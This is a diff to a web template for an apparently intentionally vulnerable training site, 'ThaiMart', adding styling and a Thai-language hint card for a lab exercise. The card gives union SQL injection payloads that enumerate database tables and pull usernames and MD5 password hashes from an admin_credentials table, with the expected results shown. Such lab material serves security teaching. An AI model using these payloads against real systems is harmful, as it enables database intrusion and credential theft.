@@ -6,8 +6,52 @@
   <title><%= title %> | ThaiMart</title>
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-  <link href="https://fonts.googleapis.com/css2?family=Sarabun:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+  <link href="https://fonts.googleapis.com/css2?family=Sarabun:wght@300;400;500;600;700&family=Fira+Code:wght@400;500&display=swap" rel="stylesheet">
   <link rel="stylesheet" href="/css/style.css">
+  <style>
+    .expected-output {
+      background: #f0fdf4;
+      border: 1px solid #22c55e;
+      border-radius: 8px;
+      padding: 1rem;
+      margin-top: 1rem;
+    }
+    .expected-output h4 {
+      color: #166534;
+      margin-bottom: 0.75rem;
+      font-size: 0.9rem;
+    }
+    .expected-table {
+      font-family: 'Fira Code', monospace;
+      font-size: 0.8rem;
+      background: #dcfce7;
+      padding: 0.75rem;
+      border-radius: 6px;
+      overflow-x: auto;
+      white-space: pre;
+      color: #166534;
+    }
+    .step-card {
+      background: white;
+      border: 1px solid var(--border);
+      border-radius: 8px;
+      padding: 1rem;
+      margin-bottom: 1rem;
+    }
+    .step-card h5 {
+      color: var(--primary);
+      margin-bottom: 0.5rem;
+    }
+    .payload-code {
+      font-family: 'Fira Code', monospace;
+      font-size: 0.85rem;
+      background: #1e1e1e;
+      color: #d4d4d4;
+      padding: 0.75rem;
+      border-radius: 6px;
+      overflow-x: auto;
+    }
+  </style>
 </head>
 <body>
   <header class="header">
@@ -101,6 +145,49 @@
             <a href="/lab05?q=HR" class="btn btn-sm btn-outline">HR</a>
             <a href="/lab05?q=Finance" class="btn btn-sm btn-outline">Finance</a>
           </div>
+        </div>
+      </div>
+
+      <!-- Union SQLi Reference -->
+      <div class="card mt-3">
+        <div class="card-header">🔍 Union SQL Injection - ผลลัพธ์ที่ควรเห็น</div>
+        <div class="card-body">
+
+          <!-- Step 4: List Tables -->
+          <div class="step-card">
+            <h5>Step 4: ดูรายชื่อตารางในฐานข้อมูล</h5>
+            <div class="payload-code">' UNION SELECT 1,table_name,3,4 FROM information_schema.tables WHERE table_schema=current_schema()--</div>
+            <div class="expected-output">
+              <h4>✅ ผลลัพธ์ที่ควรเห็น:</h4>
+              <div class="expected-table">ID │ ชื่อ-นามสกุล       │ แผนก │ ตำแหน่ง
+───┼───────────────────┼──────┼────────
+1  │ staff             │ 3    │ 4
+1  │ admin_credentials │ 3    │ 4
+1  │ playground_products│ 3   │ 4
+1  │ seller_accounts   │ 3    │ 4
+1  │ categories        │ 3    │ 4
+...</div>
+              <p style="font-size: 0.85rem; color: var(--text-muted); margin-top: 0.5rem;">
+                💡 สังเกต: ชื่อตาราง <strong>admin_credentials</strong> ดูน่าสนใจ!
+              </p>
+            </div>
+          </div>
+
+          <!-- Step 6: Extract Credentials -->
+          <div class="step-card">
+            <h5>Step 6: ดึงข้อมูลจากตาราง admin_credentials</h5>
+            <div class="payload-code">' UNION SELECT id,username,password_hash,role FROM admin_credentials--</div>
+            <div class="expected-output">
+              <h4>✅ ผลลัพธ์ที่ควรเห็น:</h4>
+              <div class="expected-table">ID │ ชื่อ-นามสกุล │ แผนก                             │ ตำแหน่ง
+───┼─────────────┼──────────────────────────────────┼─────────────
+1  │ superadmin  │ e10adc3949ba59abbe56e057f20f883e │ administrator</div>
+              <p style="font-size: 0.85rem; color: var(--text-muted); margin-top: 0.5rem;">
+                💡 พบบัญชี <strong>superadmin</strong> พร้อม password hash (MD5)
+              </p>
+            </div>
+          </div>
+
         </div>
       </div>
     </div>
